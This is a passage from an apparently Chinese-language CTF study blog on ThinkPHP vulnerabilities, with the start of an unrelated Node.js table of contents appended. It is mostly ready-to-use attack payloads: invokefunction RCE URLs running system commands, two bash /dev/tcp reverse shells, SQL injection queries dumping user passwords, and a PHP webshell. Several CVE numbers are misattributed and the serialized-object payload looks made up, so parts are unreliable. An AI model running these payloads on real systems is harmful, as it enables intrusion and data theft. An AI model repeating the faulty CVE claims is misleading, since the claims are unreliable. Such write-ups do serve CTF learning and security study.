<li><strong>CVE-2018-20062</strong>：该漏洞允许通过 URL 调用任意函数，导致远程代码执行。</li>
<li><strong>CVE-2019-9082</strong>：此漏洞存在于 ThinkPHP 5.x 系列，通过路径构造可以实现远程代码执行。</li>
</ul>
<p><strong>ThinkPHP 3.x 漏洞历史</strong>：</p>
<ul>
<li><strong>路径遍历漏洞</strong>：攻击</li>
</ul>
<p>者可以通过不安全的路径输入读取系统敏感文件。</p>
<ul>
<li><strong>反序列化漏洞</strong>：未安全处理反序列化数据，可能导致远程代码执行。</li>
</ul>
<hr>
<h3 id="CTF-题目中的-ThinkPHP-漏洞总结"><a href="#CTF-题目中的-ThinkPHP-漏洞总结" class="headerlink" title="CTF 题目中的 ThinkPHP 漏洞总结"></a>CTF 题目中的 ThinkPHP 漏洞总结</h3><p>在 CTF 中，常见的 ThinkPHP 相关题目漏洞有以下几类：</p>
<ol>
<li><strong>SQL 注入</strong>：利用不安全的 SQL 查询进行注入操作。</li>
<li><strong>远程代码执行</strong>：通过构造特殊的 URL 或输入执行系统命令。</li>
<li><strong>路径遍历</strong>：通过不当的文件路径处理读取服务器上的敏感文件。</li>
<li><strong>反序列化漏洞</strong>：利用反序列化机制实现任意代码执行。</li>
</ol>
<p>掌握这些攻击技巧和防御措施，可以帮助 CTF 选手在比赛中快速识别并利用 ThinkPHP 漏洞。</p>
<hr>
<h2 id="1-CVE-2018-20062-ThinkPHP-远程代码执行漏洞"><a href="#1-CVE-2018-20062-ThinkPHP-远程代码执行漏洞" class="headerlink" title="1. CVE-2018-20062 - ThinkPHP 远程代码执行漏洞"></a>1. <strong>CVE-2018-20062</strong> - ThinkPHP 远程代码执行漏洞</h2><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p><strong>CVE-2018-20062</strong> 是 ThinkPHP 5.x 系列中一个远程代码执行漏洞。该漏洞利用了框架中对 URL 参数的处理不当，允许攻击者通过构造恶意的 URL 调用 PHP 内置函数，最终实现代码执行。</p>
<h3 id="受影响版本：-1"><a href="#受影响版本：-1" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul>
<li>ThinkPHP 5.0.23 及其之前版本</li>
<li>ThinkPHP 5.1.31 及其之前版本</li>
</ul>
<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>ThinkPHP 在路由处理时，允许 URL 中的函数和参数直接调用系统函数，导致攻击者可以通过构造恶意的 URL 来调用任意函数并执行系统命令。</p>
<h3 id="漏洞利用的-URL-格式："><a href="#漏洞利用的-URL-格式：" class="headerlink" title="漏洞利用的 URL 格式："></a>漏洞利用的 URL 格式：</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-params">[函数名]</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=参数1&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=参数2...</span><br></code></pre></td></tr></table></figure>

<h3 id="利用-Payload-示例："><a href="#利用-Payload-示例：" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="执行-phpinfo-函数："><a href="#执行-phpinfo-函数：" class="headerlink" title="执行 phpinfo() 函数："></a>执行 <code>phpinfo()</code> 函数：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<br></code></pre></td></tr></table></figure>

<h4 id="执行系统命令-whoami："><a href="#执行系统命令-whoami：" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br></code></pre></td></tr></table></figure>

<h4 id="执行-id-命令获取用户权限："><a href="#执行-id-命令获取用户权限：" class="headerlink" title="执行 id 命令获取用户权限："></a>执行 <code>id</code> 命令获取用户权限：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br></code></pre></td></tr></table></figure>

<h4 id="执行反向-Shell-命令："><a href="#执行反向-Shell-命令：" class="headerlink" title="执行反向 Shell 命令："></a>执行反向 Shell 命令：</h4><p>如果服务器允许外部网络访问，可以使用以下 Payload 触发反向 Shell：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">bash</span>+-<span class="hljs-title">c</span>+&#x27;<span class="hljs-title">bash</span>+-<span class="hljs-title">i</span>+&gt;&amp;+/<span class="hljs-title">dev</span>/<span class="hljs-title">tcp</span>/<span class="hljs-params">[IP]</span>/<span class="hljs-params">[PORT]</span>+0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="2-CVE-2019-9082-ThinkPHP-远程代码执行漏洞"><a href="#2-CVE-2019-9082-ThinkPHP-远程代码执行漏洞" class="headerlink" title="2. CVE-2019-9082 - ThinkPHP 远程代码执行漏洞"></a>2. <strong>CVE-2019-9082</strong> - ThinkPHP 远程代码执行漏洞</h2><h3 id="背景：-1"><a href="#背景：-1" class="headerlink" title="背景："></a>背景：</h3><p><strong>CVE-2019-9082</strong> 是 ThinkPHP 5.x 中另一个远程代码执行漏洞。此漏洞发生在处理 URL 时，攻击者可以构造恶意的 URL 通过框架执行任意的系统命令。</p>
<h3 id="受影响版本：-2"><a href="#受影响版本：-2" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul>
<li>ThinkPHP 5.0.23 及其之前版本</li>
<li>ThinkPHP 5.1.31 及其之前版本</li>
</ul>
<h3 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>类似于 <strong>CVE-2018-20062</strong>，该漏洞允许攻击者在 URL 中调用 PHP 内置函数，最终实现代码执行。</p>
<h3 id="利用-Payload-示例：-1"><a href="#利用-Payload-示例：-1" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="执行-phpinfo-函数：-1"><a href="#执行-phpinfo-函数：-1" class="headerlink" title="执行 phpinfo() 函数："></a>执行 <code>phpinfo()</code> 函数：</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="执行系统命令-whoami：-1"><a href="#执行系统命令-whoami：-1" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>

<h4 id="获取文件列表（执行-ls-命令）："><a href="#获取文件列表（执行-ls-命令）：" class="headerlink" title="获取文件列表（执行 ls 命令）："></a>获取文件列表（执行 <code>ls</code> 命令）：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bash<br>复制代码<br><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>

<h4 id="执行反向-Shell："><a href="#执行反向-Shell：" class="headerlink" title="执行反向 Shell："></a>执行反向 Shell：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="3-CVE-2018-19518-ThinkPHP-反序列化远程代码执行漏洞"><a href="#3-CVE-2018-19518-ThinkPHP-反序列化远程代码执行漏洞" class="headerlink" title="3. CVE-2018-19518 - ThinkPHP 反序列化远程代码执行漏洞"></a>3. <strong>CVE-2018-19518</strong> - ThinkPHP 反序列化远程代码执行漏洞</h2><h3 id="背景：-2"><a href="#背景：-2" class="headerlink" title="背景："></a>背景：</h3><p>该漏洞是 ThinkPHP 5.x 系列中的一个反序列化漏洞。攻击者可以通过精心构造的反序列化数据传递恶意对象，导致远程代码执行。</p>
<h3 id="受影响版本：-3"><a href="#受影响版本：-3" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul>
<li>ThinkPHP 5.x 系列</li>
</ul>
<h3 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>PHP 中的序列化与反序列化操作如果处理不当，会导致攻击者通过构造恶意序列化数据进行对象注入。ThinkPHP 在某些功能中使用了不安全的反序列化操作，导致可以利用恶意序列化对象实现代码执行。</p>
<h3 id="利用-Payload-示例：-2"><a href="#利用-Payload-示例：-2" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="恶意序列化数据："><a href="#恶意序列化数据：" class="headerlink" title="恶意序列化数据："></a>恶意序列化数据：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>该序列化对象中的 <code>exec</code> 字段会被执行，从而调用 <code>phpinfo()</code> 函数。</p>
<h4 id="执行系统命令-whoami：-2"><a href="#执行系统命令-whoami：-2" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="4-CVE-2018-1000861-ThinkPHP-模板注入漏洞"><a href="#4-CVE-2018-1000861-ThinkPHP-模板注入漏洞" class="headerlink" title="4. CVE-2018-1000861 - ThinkPHP 模板注入漏洞"></a>4. <strong>CVE-2018-1000861</strong> - ThinkPHP 模板注入漏洞</h2><h3 id="背景：-3"><a href="#背景：-3" class="headerlink" title="背景："></a>背景：</h3><p>模板注入漏洞允许攻击者通过不当的输入插入并执行任意的 PHP 代码。此漏洞发生在开发者未正确过滤用户输入的情况下，导致攻击者可以通过模板引擎执行恶意代码。</p>
<h3 id="受影响版本：-4"><a href="#受影响版本：-4" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul>
<li>ThinkPHP 3.x 和 5.x 系列</li>
</ul>
<h3 id="利用-Payload-示例：-3"><a href="#利用-Payload-示例：-3" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="通过模板注入执行-phpinfo-："><a href="#通过模板注入执行-phpinfo-：" class="headerlink" title="通过模板注入执行 phpinfo()："></a>通过模板注入执行 <code>phpinfo()</code>：</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="通过模板注入执行系统命令-whoami："><a href="#通过模板注入执行系统命令-whoami：" class="headerlink" title="通过模板注入执行系统命令 whoami："></a>通过模板注入执行系统命令 <code>whoami</code>：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>

<h4 id="获取文件列表（执行-ls-命令）：-1"><a href="#获取文件列表（执行-ls-命令）：-1" class="headerlink" title="获取文件列表（执行 ls 命令）："></a>获取文件列表（执行 <code>ls</code> 命令）：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="5-CVE-2019-8018-ThinkPHP-SQL-注入漏洞"><a href="#5-CVE-2019-8018-ThinkPHP-SQL-注入漏洞" class="headerlink" title="5. CVE-2019-8018 - ThinkPHP SQL 注入漏洞"></a>5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL 注入漏洞</h2><h3 id="背景：-4"><a href="#背景：-4" class="headerlink" title="背景："></a>背景：</h3><p>此漏洞存在于 ThinkPHP 中的 SQL 查询处理部分，攻击者可以通过注入恶意的 SQL 查询操控数据库。在某些场景下，未正确过滤或使用不安全的查询方式，导致攻击者通过拼接 SQL 语句进行注入。</p>
<h3 id="受影响版本：-5"><a href="#受影响版本：-5" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul>
<li>ThinkPHP 3.x 系列</li>
</ul>
<h3 id="利用-Payload-示例：-4"><a href="#利用-Payload-示例：-4" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="获取数据库所有用户信息："><a href="#获取数据库所有用户信息：" class="headerlink" title="获取数据库所有用户信息："></a>获取数据库所有用户信息：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>--<br></code></pre></td></tr></table></figure>

<h4 id="利用-UNION-SELECT-获取数据库版本："><a href="#利用-UNION-SELECT-获取数据库版本：" class="headerlink" title="利用 UNION SELECT 获取数据库版本："></a>利用 <code>UNION SELECT</code> 获取数据库版本：</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">index.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-built_in">version</span>(), <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<h4 id="查询所有表名："><a href="#查询所有表名：" class="headerlink" title="查询所有表名："></a>查询所有表名：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT table_name <span class="hljs-keyword">FROM</span> information_schema.tables WHERE <span class="hljs-attribute">table_schema</span>=database() --<br></code></pre></td></tr></table></figure>

<h4 id="获取指定表的字段名："><a href="#获取指定表的字段名：" class="headerlink" title="获取指定表的字段名："></a>获取指定表的字段名：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT column_name <span class="hljs-keyword">FROM</span> information_schema.columns WHERE <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="6-CVE-2019-7481-ThinkPHP-后台文件上传漏洞"><a href="#6-CVE-2019-7481-ThinkPHP-后台文件上传漏洞" class="headerlink" title="6. CVE-2019-7481 - ThinkPHP 后台文件上传漏洞"></a>6. <strong>CVE-2019-7481</strong> - ThinkPHP 后台文件上传漏洞</h2><h3 id="背景：-5"><a href="#背景：-5" class="headerlink" title="背景："></a>背景：</h3><p>此漏洞涉及到 ThinkPHP 文件上传功能的处理不当。攻击者可以上传恶意的 PHP 文件，绕过文件类型检查，直接在服务器上执行任意 PHP 代码。</p>
<h3 id="受影响版本：-6"><a href="#受影响版本：-6" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul>
<li>ThinkPHP 5.x 系列</li>
</ul>
<h3 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>文件上传功能未能正确校验上传文件的后缀名或 MIME 类型，允许攻击者上传恶意 PHP 文件并直接访问该文件。</p>
<h3 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h3><ol>
<li>上传包含 PHP 代码的 WebShell，如：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<ol>
<li>访问上传的 PHP 文件并执行命令：</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/uploads/</span>shell.php?cmd=whoami<br></code></pre></td></tr></table></figure>





<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="目录-3"><a href="#目录-3" class="headerlink" title="目录"></a>目录</h2><h2 id="1-Node-js-基础"><a href="#1-Node-js-基础" class="headerlink" title="1. Node.js 基础"></a>1. Node.js 基础</h2><ul>
<li><a href="#11-%E4%BB%80%E4%B9%88%E6%98%AF-nodejs">1.1 什么是 Node.js</a></li>
<li><a href="#12-nodejs-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">1.2 Node.js 安装与配置</a></li>
<li><a href="#13-nodejs-%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF">1.3 Node.js 运行机制与事件循环</a></li>
<li><a href="#14-nodejs-%E4%B8%8E-javascript-%E7%9A%84%E5%8C%BA%E5%88%AB">1.4 Node.js 与 JavaScript 的区别</a></li>
</ul>
<h2 id="2-模块与包管理"><a href="#2-模块与包管理" class="headerlink" title="2. 模块与包管理"></a>2. 模块与包管理</h2><ul>
<li><p><a href="#21-nodejs-%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97">2.1 Node.js 内置模块</a></p>
<ul>
<li><a href="#211-fs-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97">2.1.1 <code>fs</code> 文件系统模块</a></li>
<li><a href="#212-http-%E6%A8%A1%E5%9D%97">2.1.2 <code>http</code> 模块</a></li>
<li><a href="#213-path-%E6%A8%A1%E5%9D%97">2.1.3 <code>path</code> 模块</a></li>
<li><a href="#214-os-%E6%A8%A1%E5%9D%97">2.1.4 <code>os</code> 模块</a></li>
<li><a href="#215-crypto-%E6%A8%A1%E5%9D%97">2.1.5 <code>crypto</code> 模块</a></li>
</ul>
</li>
<li><p><a href="#22-%E4%BD%BF%E7%94%A8-npm-%E5%92%8C%E5%8C%85%E7%AE%A1%E7%90%86">2.2 使用 NPM 和包管理</a></p>
<ul>
<li><a href="#221-npm-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8">2.2.1 NPM 的安装和使用</a></li>
<li><a href="#222-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96">2.2.2 管理项目依赖</a></li>
<li><a href="#223-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E4%B8%8E%E8%AF%AD%E4%B9%89%E5%8C%96%E7%89%88%E6%9C%AC">2.2.3 版本控制与语义化版本</a></li>
<li><a href="#224-%E4%BD%BF%E7%94%A8-packagejson-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE">2.2.4 使用 <code>package.json</code> 管理项目</a></li>
</ul>
</li>
<li><p><a href="#23-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E4%B8%8E-commonjs-%E8%A7%84%E8%8C%83">2.3 自定义模块与 CommonJS 规范</a></p>
<ul>
<li><a href="#231-%E5%AF%BC%E5%85%A5%E4%B8%8E%E5%AF%BC%E5%87%BA%E6%A8%A1%E5%9D%97">2.3.1 导入与导出模块</a></li>
<li><a href="#232-commonjs-%E5%92%8C-es6-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB">2.3.2 CommonJS 和 ES6 模块的区别</a></li>
</ul>
</li>
</ul>
<h2 id="3-异步编程"><a href="#3-异步编程" class="headerlink" title="3. 异步编程"></a>3. 异步编程</h2><ul>
<li><p><a href="#31-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80">3.1 异步编程基础</a></p>
<ul>
<li><a href="#311-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">3.1.1 回调函数</a></li>
<li><a href="#312-promise-%E5%AF%B9%E8%B1%A1">3.1.2 <code>Promise</code> 对象</a></li>
<li><a href="#313-asyncawait-%E8%AF%AD%E6%B3%95">3.1.3 <code>async/await</code> 语法</a></li>
</ul>
</li>
<li><p><a href="#32-%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B">3.2 事件驱动编程</a></p>
<ul>
<li><a href="#321-%E4%BD%BF%E7%94%A8-eventemitter">3.2.1 使用 <code>EventEmitter</code></a></li>
<li><a href="#322-%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">3.2.2 自定义事件处理</a></li>
</ul>
</li>
<li><p><a href="#33-%E5%BC%82%E6%AD%A5%E6%8E%A7%E5%88%B6%E6%B5%81%E7%AE%A1%E7%90%86">3.3 异步控制流管理</a></p>
<ul>
<li><a href="#331-asyncjs-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8">3.3.1 <code>async.js</code> 库的使用</a></li>
<li><a href="#332-%E5%BC%82%E6%AD%A5%E9%98%9F%E5%88%97%E4%B8%8E%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6">3.3.2 异步队列与并发控制</a></li>
</ul>
</li>
</ul>
<h2 id="4-文件操作与-I-O"><a href="#4-文件操作与-I-O" class="headerlink" title="4. 文件操作与 I&#x2F;O"></a>4. 文件操作与 I&#x2F;O</h2><ul>
<li><p><a href="#41-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C">4.1 文件系统操作</a></p>
<ul>
<li><a href="#411-%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">4.1.1 读取与写入文件</a></li>
<li><a href="#412-%E6%96%87%E4%BB%B6%E6%B5%81%E4%B8%8E%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">4.1.2 文件流与大文件处理</a></li>
</ul>
</li>
<li><p><a href="#42-%E7%BD%91%E7%BB%9C-io-%E6%93%8D%E4%BD%9C">4.2 网络 I&#x2F;O 操作</a></p>
<ul>
<li><a href="#421-%E5%88%9B%E5%BB%BA-http-%E6%9C%8D%E5%8A%A1%E5%99%A8">4.2.1 创建 HTTP 服务器</a></li>
<li><a href="#422-%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">4.2.2 处理请求与响应</a></li>
<li><a href="#423-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1">4.2.3 使用 <code>https</code> 模块进行安全通信</a></li>
</ul>
</li>
</ul>
<h2 id="5-数据库与存储"><a href="#5-数据库与存储" class="headerlink" title="5. 数据库与存储"></a>5. 数据库与存储</h2><ul>
<li><p><a href="#51-%E4%BD%BF%E7%94%A8-mongodb">5.1 使用 MongoDB</a></p>
<ul>
<li><a href="#511-%E8%BF%9E%E6%8E%A5%E5%88%B0-mongodb">5.1.1 连接到 MongoDB</a></li>
<li><a href="#512-crud-%E6%93%8D%E4%BD%9C">5.1.2 CRUD 操作</a></li>
<li><a href="#513-%E4%BD%BF%E7%94%A8-mongoose-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1">5.1.3 使用 Mongoose 进行数据建模</a></li>
</ul>
</li>
<li><p><a href="#52-%E4%BD%BF%E7%94%A8-mysql">5.2 使用 MySQL</a></p>
<ul>
<li><a href="#521-%E8%BF%9E%E6%8E%A5%E5%88%B0-mysql">5.2.1 连接到 MySQL</a></li>
<li><a href="#522-%E6%89%A7%E8%A1%8C-sql-%E6%9F%A5%E8%AF%A2">5.2.2 执行 SQL 查询</a></li>
<li><a href="#523-%E4%BD%BF%E7%94%A8-sequelize-%E8%BF%9B%E8%A1%8C-orm-%E6%98%A0%E5%B0%84">5.2.3 使用 <code>sequelize</code> 进行 ORM 映射</a></li>
</ul>
</li>
</ul>
<h2 id="6-Web-开发与框架"><a href="#6-Web-开发与框架" class="headerlink" title="6. Web 开发与框架"></a>6. Web 开发与框架</h2><ul>
<li><p><a href="#61-%E4%BD%BF%E7%94%A8-express-%E6%A1%86%E6%9E%B6">6.1 使用 Express 框架</a></p>
<ul>
<li><a href="#611-%E5%88%9B%E5%BB%BA%E5%9F%BA%E6%9C%AC%E7%9A%84-express-%E5%BA%94%E7%94%A8">6.1.1 创建基本的 Express 应用</a></li>
<li><a href="#612-%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6">6.1.2 路由与中间件</a></li>
<li><a href="#613-%E5%A4%84%E7%90%86%E8%A1%A8%E5%8D%95%E5%92%8C-json-%E6%95%B0%E6%8D%AE">6.1.3 处理表单和 JSON 数据</a></li>
<li><a href="#614-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">6.1.4 错误处理</a></li>
</ul>
</li>
<li><p><a href="#62-%E4%BD%BF%E7%94%A8-koa-%E6%A1%86%E6%9E%B6">6.2 使用 Koa 框架</a></p>
<ul>
<li><a href="#621-koa-%E7%9A%84%E7%89%B9%E7%82%B9%E4%B8%8E-express-%E5%AF%B9%E6%AF%94">6.2.1 Koa 的特点与 Express 对比</a></li>
<li><a href="#622-%E5%88%9B%E5%BB%BA-koa-%E5%BA%94%E7%94%A8">6.2.2 创建 Koa 应用</a></li>
<li><a href="#623-%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%A4%84%E7%90%86">6.2.3 中间件与路由处理</a></li>
</ul>
</li>
<li><p><a href="#63-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E">6.3 模板引擎</a></p>
<ul>
